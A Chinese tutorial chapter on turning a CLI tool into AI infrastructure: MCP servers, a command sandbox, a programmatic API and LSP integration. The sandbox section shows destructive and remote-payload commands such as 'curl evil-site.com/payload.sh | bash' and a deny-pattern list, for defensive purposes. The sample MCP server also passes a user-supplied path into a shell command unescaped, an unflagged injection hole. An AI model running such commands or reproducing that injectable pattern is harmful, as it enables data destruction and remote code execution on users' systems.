# 第 14 章：面向未来 — CLI 作为 AI 基础设施

前面十三章围绕"如何构建一个 CLI 工具"展开，技术栈从参数解析到终端 UI 全部覆盖。这最后一章把视角抬高——CLI 工具不只是给人用的命令行程序，它正在成为 AI 时代的基础设施层。

## MCP — 让 CLI 成为 AI Agent 的工具

### MCP 是什么

Model Context Protocol（MCP）是 Anthropic 在 2024 年底推出的开放协议，解决的问题很具体：**AI 模型如何发现和调用外部工具**。

在 MCP 出现之前，每个 AI 应用都自己定义工具调用的格式。OpenAI 有 Function Calling，Anthropic 有 Tool Use，LangChain 有自己的 Tool 抽象。工具提供方要为每个平台写不同的适配层。MCP 试图统一这个接口——一个工具只需要实现一次 MCP 协议，就能被所有支持 MCP 的 AI 客户端调用。

MCP 的架构是标准的 Client-Server 模型：

```
AI 应用（MCP Client）  ←→  MCP Server（工具提供方）
     Claude Desktop          文件系统访问
     Cursor                  数据库查询
     Claude Code             repox scan / review
```

MCP Server 向 Client 声明自己提供哪些工具（tools）、能访问哪些资源（resources）、支持哪些提示模板（prompts）。Client 根据用户的对话上下文，决定调用哪个工具，把参数传给 Server，Server 执行后返回结果。

### CLI as MCP Server

CLI 工具天然适合作为 MCP Server。原因有三：

1. CLI 已经定义好了清晰的命令接口——每个子命令就是一个工具，参数和选项就是工具的输入 schema
2. CLI 的输出通常是结构化的（JSON 模式），可以直接作为工具返回值
3. CLI 的执行环境是本地的，能访问文件系统和 Git 仓库——这正是 AI Agent 最需要的能力

把 repox 暴露为 MCP Server 的概念实现：

```typescript
// src/mcp-server.ts
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js'
import { z } from 'zod'
import { scanDirectory } from './core/scanner.js'
import { reviewChanges } from './core/reviewer.js'

const server = new McpServer({
  name: 'repox',
  version: '0.1.0',
})

// 注册 scan 工具
server.tool(
  'scan',
  '扫描仓库结构，返回文件统计和项目画像',
  {
    directory: z.string().optional().describe('目标目录路径，默认当前目录'),
    includeHidden: z.boolean().optional().describe('是否包含隐藏文件'),
  },
  async ({ directory, includeHidden }) => {
    const result = await scanDirectory(directory || '.', { includeHidden })
    return {
      content: [{
        type: 'text',
        text: JSON.stringify(result, null, 2),
      }],
    }
  }
)

// 注册 review 工具
server.tool(
  'review',
  '审查 Git 变更，返回代码审查建议',
  {
    ref: z.string().optional().describe('Git 引用，如 HEAD~3 或分支名'),
    focus: z.string().optional().describe('关注的文件路径模式'),
  },
  async ({ ref, focus }) => {
    const result = await reviewChanges({ ref, focus })
    return {
      content: [{
        type: 'text',
        text: JSON.stringify(result, null, 2),
      }],
    }
  }
)

// 启动服务
async function main() {
  const transport = new StdioServerTransport()
  await server.connect(transport)
}

main()
```

关键点在 `StdioServerTransport`——MCP 的通信走 stdio（stdin/stdout），和 Language Server Protocol 一样。这意味着 MCP Server 不需要监听端口，不需要 HTTP 服务器，直接作为子进程启动，通过管道通信。CLI 工具的 stdin/stdout 管道机制在这里完美契合。

用户配置 Claude Desktop 或 Cursor 使用 repox MCP Server：

```json
{
  "mcpServers": {
    "repox": {
      "command": "npx",
      "args": ["repox", "--mcp"],
      "cwd": "/path/to/project"
    }
  }
}
```

配置完成后，AI 模型在对话中可以直接调用 repox 的能力。用户问"这个仓库的结构是怎样的"，AI 会自动调用 `scan` 工具获取信息再回答。用户说"帮我看看最近的改动有没有问题"，AI 调用 `review` 工具拿到审查结果。

### 20 行代码：最小 MCP Server

下面这个例子把 `repox scan` 暴露为一个 MCP tool。将它保存为 `mcp-server.js`，就可以在 Claude Code 中配置使用：

```javascript
// mcp-server.js — 最小 MCP Server 示例
import { execSync } from 'node:child_process'

// MCP 使用 stdin/stdout 通信（JSON-RPC 2.0 over stdio）
process.stdin.setEncoding('utf-8')
let buffer = ''

process.stdin.on('data', (chunk) => {
  buffer += chunk
  const lines = buffer.split('\n')
  buffer = lines.pop() || ''
  for (const line of lines) {
    if (!line.trim()) continue
    try {
      const request = JSON.parse(line)
      const response = handleRequest(request)
      process.stdout.write(JSON.stringify(response) + '\n')
    } catch {}
  }
})

function handleRequest(req) {
  if (req.method === 'initialize') {
    return { jsonrpc: '2.0', id: req.id, result: {
      protocolVersion: '2024-11-05',
      capabilities: { tools: {} },
      serverInfo: { name: 'repox-mcp', version: '0.1.0' },
    }}
  }
  if (req.method === 'tools/list') {
    return { jsonrpc: '2.0', id: req.id, result: { tools: [{
      name: 'scan_project',
      description: '扫描项目结构，返回技术栈、依赖、Git 信息',
      inputSchema: { type: 'object', properties: {
        path: { type: 'string', description: '项目路径' }
      }}
    }]}}
  }
  if (req.method === 'tools/call' && req.params?.name === 'scan_project') {
    const path = req.params.arguments?.path || '.'
    const result = execSync(`npx tsx src/index.ts scan --format json --path "${path}"`, { encoding: 'utf-8' })
    return { jsonrpc: '2.0', id: req.id, result: { content: [{ type: 'text', text: result }] } }
  }
  return { jsonrpc: '2.0', id: req.id, error: { code: -32601, message: 'Method not found' } }
}
```

在 Claude Code 的 `.claude/settings.json` 中配置：

```json
{
  "mcpServers": {
    "repox": {
      "command": "node",
      "args": ["mcp-server.js"],
      "cwd": "/path/to/repox"
    }
  }
}
```

配置后 Claude Code 就能直接调用 `scan_project` 工具来分析任意项目——你的 CLI 变成了 AI 的"眼睛"。

### 从 CLI 到 MCP 的复用策略

已有的 CLI 代码不需要为 MCP 重写。核心逻辑（扫描、审查、分析）在 `core/` 层，CLI 命令和 MCP 工具都只是这层逻辑的不同入口：

```
用户                       AI Agent
  │                          │
  ▼                          ▼
CLI 入口 (commander)    MCP 入口 (mcp-server)
  │                          │
  └──────────┬───────────────┘
             ▼
      核心逻辑 (core/)
        scanner.ts
        reviewer.ts
        ai.ts
```

这也是为什么前面章节反复强调"命令处理函数不要包含业务逻辑"的原因。如果 `scan` 命令的逻辑全写在 commander 的 action 回调里，MCP Server 就没办法复用，得复制一遍代码。把逻辑下沉到 `core/` 层，CLI 和 MCP 都只是薄薄的适配层。

## 子进程沙箱：安全执行用户命令

### 为什么需要沙箱

当 CLI 工具开始执行 AI 生成的命令时，安全问题变得严峻。AI 模型可能生成危险操作：

```bash
# AI 觉得"清理无用文件"可以这么做
rm -rf /
# 或者
curl evil-site.com/payload.sh | bash
```

这不是假设场景——任何允许 AI Agent 执行 shell 命令的系统都必须考虑这个问题。Claude Code 和 Codex CLI 都在这方面做了大量工作。

### 现有方案的实现思路

**macOS Seatbelt**：macOS 内置的沙箱机制。通过 `sandbox-exec` 命令配合沙箱配置文件（`.sb`），可以限制子进程的文件系统访问、网络访问和进程创建权限。Codex CLI 在 macOS 上使用这个方案。

```bash
# Seatbelt 配置示例（简化）
(version 1)
(deny default)
(allow file-read* (subpath "/path/to/project"))
(allow file-write* (subpath "/path/to/project"))
(deny file-write* (subpath "/path/to/project/.git"))
(deny network*)
```

**Linux Bubblewrap + Landlock + seccomp**：Linux 没有 Seatbelt 的直接对应物，但有更细粒度的安全原语。

- **Bubblewrap**（`bwrap`）：创建轻量级容器，隔离文件系统命名空间。只挂载允许访问的目录
- **Landlock**：Linux 5.13+ 的内核特性，用户态程序可以限制自身的文件系统访问权限
- **seccomp**：限制子进程可以调用的系统调用（syscall），从内核层面阻止危险操作

Codex CLI 在 Linux 上组合使用了这三者，形成了多层防御。

### 简单实现思路

不是所有项目都需要操作系统级别的沙箱。对于 repox 这样的工具，一个可行的起步方案是**白名单 + 受限子进程**：

```typescript
// src/core/sandbox.ts
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'

const execFileAsync = promisify(execFile)

// 允许执行的命令白名单
const ALLOWED_COMMANDS = new Set([
  'git', 'node', 'npm', 'npx', 'cat', 'ls', 'wc',
  'grep', 'find', 'head', 'tail', 'sort', 'uniq',
])

// 禁止的参数模式
const DANGEROUS_PATTERNS = [
  /rm\s+-rf/,
  />\s*\/dev/,
  /curl.*\|\s*bash/,
  /wget.*\|\s*sh/,
  /chmod\s+[0-7]*7[0-7]*/,  // 设置全局可写
]

interface SandboxOptions {
  cwd: string
  timeout?: number  // 毫秒
  maxBuffer?: number  // 输出大小限制
}

export async function execSandboxed(
  command: string,
  args: string[],
  options: SandboxOptions
): Promise<{ stdout: string; stderr: string }> {
  // 检查命令白名单
  if (!ALLOWED_COMMANDS.has(command)) {
    throw new Error(`命令 "${command}" 不在允许列表中`)
  }

  // 检查危险参数
  const fullCommand = `${command} ${args.join(' ')}`
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(fullCommand)) {
      throw new Error(`检测到危险命令模式: ${fullCommand}`)
    }
  }

  return execFileAsync(command, args, {
    cwd: options.cwd,
    timeout: options.timeout || 30_000,
    maxBuffer: options.maxBuffer || 10 * 1024 * 1024,  // 10MB
    env: {
      ...process.env,
      // 限制子进程的环境变量
      PATH: '/usr/local/bin:/usr/bin:/bin',
      HOME: process.env.HOME,
      // 不传递 API key 等敏感变量
    },
  })
}
```

这个方案的安全性远不如操作系统级沙箱——白名单可以绕过（`node -e "require('child_process').execSync('rm -rf /')""`），参数模式匹配也无法覆盖所有情况。但它提供了基本的防护层，适合作为第一步实现。

更完善的方案需要多层防御：

```
层级 1: 命令白名单 + 参数检查（应用层）
层级 2: 用户确认（交互层，参考 Claude Code 的权限弹窗）
层级 3: 文件系统隔离（OS 层，Bubblewrap / Seatbelt）
层级 4: 系统调用限制（内核层，seccomp）
```

每一层都不是完美的，但叠加起来能把风险降到可接受的水平。

## CLI as API：programmatic 调用模式

CLI 工具的用户不只是在终端前敲命令的人，还有其他程序。一个设计良好的 CLI 应该支持被 programmatic 调用——从 Node.js 代码中直接调用，不需要 spawn 子进程。

### 为什么需要 programmatic API

spawn 子进程的开销不小：进程创建、参数序列化、stdout 捕获、JSON 解析。对于一次性调用可以接受，但如果其他工具需要频繁调用 repox 的功能（比如一个 VS Code 插件需要实时扫描），子进程方式就太慢了。

更重要的是类型安全。通过子进程调用，输入输出都是字符串，调用方需要自己解析和校验。通过 programmatic API 调用，输入输出都有 TypeScript 类型，编译期就能发现错误。

### 导出 createProgram

```typescript
// src/index.ts — 对外导出 API
export { createProgram } from './api.js'
export type { ScanResult, ReviewResult, ScanOptions, ReviewOptions } from './types.js'
```

```typescript
// src/api.ts
import { scanDirectory } from './core/scanner.js'
import { reviewChanges } from './core/reviewer.js'
import type { ScanOptions, ScanResult, ReviewOptions, ReviewResult } from './types.js'

export interface RepoxAPI {
  scan(options?: ScanOptions): Promise<ScanResult>
  review(options?: ReviewOptions): Promise<ReviewResult>
}

export function createProgram(config?: { cwd?: string }): RepoxAPI {
  const cwd = config?.cwd || process.cwd()

  return {
    async scan(options = {}) {
      return scanDirectory(cwd, options)
    },
    async review(options = {}) {
      return reviewChanges({ ...options, cwd })
    },
  }
}
```

调用方的使用方式：

```typescript
// 其他 Node.js 项目中
import { createProgram } from 'repox'

const repox = createProgram({ cwd: '/path/to/project' })

const scanResult = await repox.scan({ includeHidden: false })
console.log(`文件数: ${scanResult.totalFiles}`)

const reviewResult = await repox.review({ ref: 'HEAD~3' })
for (const issue of reviewResult.issues) {
  console.log(`${issue.file}:${issue.line} - ${issue.message}`)
}
```

### package.json 的 exports 配置

要同时支持 CLI 入口和 API 入口，`package.json` 需要正确配置：

```json
{
  "name": "repox",
  "bin": {
    "repox": "./dist/cli.js"
  },
  "main": "./dist/api.js",
  "types": "./dist/api.d.ts",
  "exports": {
    ".": {
      "import": "./dist/api.js",
      "types": "./dist/api.d.ts"
    },
    "./cli": "./dist/cli.js"
  }
}
```

`bin` 字段指向 CLI 入口（带 shebang、解析 `process.argv`），`main`/`exports` 指向 API 入口（导出 `createProgram`）。两个入口共享 `core/` 层的代码。

构建时需要生成两个入口点：

```typescript
// build.ts
import { build } from 'esbuild'

await build({
  entryPoints: {
    cli: 'src/cli.ts',
    api: 'src/api.ts',
  },
  bundle: true,
  platform: 'node',
  outdir: 'dist',
  format: 'esm',
  // ...
})
```

## 从 CLI 到 LSP：编辑器集成

### Language Server Protocol 简介

LSP（Language Server Protocol）是微软为 VS Code 设计的协议，现在已经成为编辑器和语言服务通信的事实标准。和 MCP 类似，LSP 也是 Client-Server 架构，通信走 stdio 或 TCP。

```
编辑器（LSP Client）  ←→  Language Server
   VS Code               TypeScript（tsserver）
   Neovim                 Rust（rust-analyzer）
   Emacs                  Python（pyright）
```

LSP 定义了一套标准的消息格式：编辑器告诉 Server"用户打开了文件 X"、"用户在第 Y 行第 Z 列请求补全"，Server 返回补全列表、诊断信息、代码操作等。

### CLI 能力复用到编辑器插件

repox 的 `scan` 和 `review` 功能可以通过 LSP 集成到编辑器中：

- `scan` 的结果可以作为**诊断信息**（diagnostics）显示在编辑器的 Problems 面板中
- `review` 的建议可以作为 **Code Action** 出现在编辑器的灯泡菜单中
- 项目画像可以作为**悬停信息**（hover），当鼠标悬停在 import 语句上时显示依赖分析

概念架构：

```typescript
// repox-lsp/src/server.ts（概念性代码）
import {
  createConnection,
  TextDocuments,
  ProposedFeatures,
  DiagnosticSeverity,
} from 'vscode-languageserver/node'
import { TextDocument } from 'vscode-languageserver-textdocument'
import { createProgram } from 'repox'

const connection = createConnection(ProposedFeatures.all)
const documents = new TextDocuments(TextDocument)

const repox = createProgram()

connection.onInitialized(async () => {
  // 启动时扫描项目
  const scan = await repox.scan()
  connection.console.log(`repox: 扫描到 ${scan.totalFiles} 个文件`)
})

// 文件保存时触发审查
documents.onDidSave(async (change) => {
  const diagnostics = []
  const review = await repox.review({
    files: [change.document.uri],
  })

  for (const issue of review.issues) {
    diagnostics.push({
      severity: DiagnosticSeverity.Warning,
      range: {
        start: { line: issue.line - 1, character: 0 },
        end: { line: issue.line - 1, character: Number.MAX_VALUE },
      },
      message: issue.message,
      source: 'repox',
    })
  }

  connection.sendDiagnostics({
    uri: change.document.uri,
    diagnostics,
  })
})

documents.listen(connection)
connection.listen()
```

这里的关键是 `import { createProgram } from 'repox'`——前面实现的 programmatic API 在这里直接复用。LSP Server 不需要通过 spawn 子进程调用 repox，直接调用 JavaScript 函数，性能和类型安全都有保障。

这种从 CLI → API → LSP 的渐进式扩展路径，是"核心逻辑与入口分离"这个架构原则的最好体现。

## 开源运营

如果你打算把 CLI 工具开源，技术实现只是一半的工作。另一半是让其他人能理解、使用和参与你的项目。

### 文档

**README** 是项目的门面。一个好的 CLI 工具 README 至少包含：

- 一句话描述（what）
- 安装命令（`npm install -g repox`）
- 一个 GIF 或 asciinema 录屏展示核心功能
- 快速开始（3-5 个最常用的命令）
- 完整的命令参考（所有子命令、选项、环境变量）
- 配置文件格式说明

**CONTRIBUTING.md** 降低贡献门槛。内容包括：

- 本地开发环境搭建步骤
- 代码规范（lint 规则、提交信息格式）
- 如何运行测试
- PR 流程（分支命名、review 标准）
- 项目结构说明（新贡献者最需要的信息）

**CHANGELOG.md** 记录每个版本的变更。用户升级前会看这里了解有没有 breaking change。推荐用 [Keep a Changelog](https://keepachangelog.com/) 的格式，分 Added / Changed / Deprecated / Removed / Fixed / Security 六个分类。

### 社区基础设施

**Issue 模板**。在 `.github/ISSUE_TEMPLATE/` 下创建模板，引导用户提供有效信息：

```yaml
# .github/ISSUE_TEMPLATE/bug_report.yml
name: Bug 报告
description: 报告一个 bug
body:
  - type: textarea
    attributes:
      label: 复现步骤
      description: 具体的操作步骤
    validations:
      required: true
  - type: textarea
    attributes:
      label: 期望行为
  - type: textarea
    attributes:
      label: 实际行为
  - type: input
    attributes:
      label: repox 版本
      placeholder: "0.1.0"
  - type: input
    attributes:
      label: Node.js 版本
      placeholder: "20.11.0"
  - type: dropdown
    attributes:
      label: 操作系统
      options:
        - macOS
        - Linux
        - Windows
```

**PR 模板**。引导贡献者描述改动的背景和测试情况。

**GitHub Discussions**。比 Issue 更适合开放性讨论——功能建议、使用方法提问、最佳实践分享。Issue 留给明确的 bug 和已确认的功能请求。

### 贡献者指南的核心原则

1. **降低首次贡献的门槛**。用 `good first issue` 标签标记简单任务，在 CONTRIBUTING 中列出"适合新手的贡献方向"
2. **快速响应**。Issue 和 PR 在 48 小时内至少给一个回复（即使是"收到了，我这周看"也好过沉默）
3. **代码审查不只是纠错**。多用"如果改成这样会不会更好"而不是"这里写错了"
4. **文档和测试也是贡献**。很多人不敢改核心代码，但愿意改文档或补测试。明确欢迎这类贡献
5. **自动化减少摩擦**。CI 自动运行 lint 和测试，PR 模板自动填充 checklist，减少人工检查的负担

## 全书回顾与展望

十四章的内容，从终端基础到 AI 基础设施，完整覆盖了一个现代 CLI 工具的生命周期：

| 阶段 | 章节 | 核心内容 |
|------|------|----------|
| 基础认知 | 1 | 终端基础、CLI 与 GUI 的差异、环境搭建 |
| 命令设计 | 2-3 | 参数解析、子命令、Commander.js |
| 输出美化 | 4-5 | 颜色、表格、进度条、Spinner |
| 交互 | 6 | prompts、确认、选择列表 |
| 核心能力 | 7-8 | 文件系统、子进程、Git 操作 |
| AI 集成 | 9-10 | API 调用、流式输出、Prompt 工程 |
| 工程化 | 11-12 | 测试、CI/CD、发布、版本管理 |
| 高级 UI | 13 | Ink + React 声明式终端界面 |
| 未来方向 | 14 | MCP、沙箱、API 化、LSP、开源 |

每个阶段都围绕 repox 这个配套项目展开。repox 从第 1 章一个只有 `scan` 命令的骨架，成长为一个有 AI 能力、有测试覆盖、有发布流程的完整工具。更重要的是，repox 的架构支撑了从 CLI 到 MCP Server 到 API 到 LSP 的多入口复用——这是"核心逻辑与入口分离"这个架构原则贯穿全书的结果。

### CLI 工具开发的几个趋势

**AI Agent 驱动的交互范式变化**。传统 CLI 的交互是"人输入命令 → 机器执行"。AI Agent 时代变成了"人描述意图 → AI 拆解任务 → CLI 执行 → AI 汇总结果"。CLI 工具不再需要完美的命令记忆和参数拼写，AI 会帮用户生成正确的命令。这意味着 CLI 的 `--help` 和 JSON 输出变得更重要（AI 需要读），而命令名的"易记性"变得没那么关键。

**MCP 生态的成熟**。2025 年 MCP 还在早期阶段，但已经有大量工具实现了 MCP Server。随着协议的稳定和生态的成熟，"CLI 自带 MCP 支持"会成为标配，就像今天的 CLI 工具标配 JSON 输出一样。

**安全沙箱的标准化**。当 AI Agent 大规模执行 shell 命令时，操作系统级的安全沙箱会从"可选"变成"必须"。Linux 的 Landlock、macOS 的 App Sandbox、以及容器技术（Docker、Wasm）都在朝更易用的方向发展。未来的 CLI 框架可能会内置沙箱支持，开发者不需要自己处理 seccomp 规则。

**跨平台一致性改善**。Node.js、Deno、Bun 都在改善跨平台的一致性。Windows 上的终端环境（Windows Terminal + WSL2）也在快速进步。"这个 CLI 工具在 Windows 上跑不了"的情况会越来越少。

### 最后的建议

如果读完这本书你只记住三件事，记住这三个：

1. **stdout 和 stderr 不要混**。这决定了你的工具能不能参与管道组合。看起来是小事，但它是 CLI 工具最基本的契约。

2. **核心逻辑和入口分离**。CLI 命令、MCP Server、API、LSP 都只是入口，业务逻辑在 core 层。这个架构决策在项目早期成本很低，但后期收益极大。

3. **为 AI 友好设计**。支持 JSON 输出、写清 `--help`、返回有意义的退出码。你的工具的下一个重度用户可能不是人类，而是 AI Agent。

CLI 不是古老的技术，它是程序与程序之间最高效的通信方式。在 AI Agent 需要一个可编程执行层的时代，CLI 工具开发是一项越来越有价值的技能。

## 小结

这一章把 CLI 工具放在了更大的技术版图中：

- **MCP 协议**让 CLI 工具可以被 AI Agent 直接调用。CLI 已有的命令结构和 JSON 输出天然适配 MCP 的工具定义格式，改造成本很低。
- **子进程沙箱**是 AI Agent 时代的安全必需品。从应用层白名单到操作系统级隔离，不同层级的安全措施可以逐步加强。
- **Programmatic API**让 CLI 的能力可以被其他 Node.js 程序直接调用。`createProgram()` 模式兼顾了 CLI 入口和 API 入口，是"核心逻辑与入口分离"的直接体现。
- **LSP 集成**是 CLI 能力进入编辑器的通道。通过复用 programmatic API，LSP Server 可以零成本使用 CLI 的核心功能。
- **开源运营**需要文档、社区基础设施和明确的贡献流程。技术再好，没人能理解和参与就只是个人项目。
- **CLI 的未来**和 AI Agent 的发展紧密绑定。为 AI 友好设计不是锦上添花，而是即将到来的刚需。

## 动手试一试

1. 扩展上面的 MCP Server，增加 `explain_file` 和 `review_changes` 两个 tool
2. 在 Claude Code 中实际配置这个 MCP Server，体验"AI 调用你写的工具"的感觉
3. 思考：如果 repox 要同时支持 CLI 直接使用和 MCP Server 模式，代码应该怎么组织？（提示：核心逻辑和交互层分离）
